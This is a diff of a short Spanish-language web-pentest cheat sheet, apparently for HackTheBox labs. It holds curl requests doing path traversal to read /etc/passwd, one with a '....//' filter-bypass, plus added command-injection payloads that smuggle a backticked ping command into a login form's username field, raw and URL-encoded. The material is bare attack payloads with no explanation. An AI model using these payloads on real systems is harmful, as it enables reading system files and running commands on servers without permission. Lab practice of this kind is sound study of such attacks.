@@ -22,3 +22,9 @@
 	::: curl -s -X GET "http://targed_url_here.htb/index.php?page=....//....//....//....//....//....//....//etc/passwd"
 
 	::: curl -s -X GET "http://targed_url_here.htb/index.php?page=../../../../../../../etc/passwd"  --path-as-is			...<3 <3 <3
+
+
+*** *** *** WEB AVANZADO WEB AVANZADO
+
+	:::  curl  http://test.test/test/login  --data 'username=;`ping -c 4 -4 ip_vpn_here`'
+	:::  curl  http://test.test/test/login  --data-urlencode 'username=;`ping -c 4 -4 ip_vpn_here`'     "encodea con --data-urlencode ......<3 <3 <3"
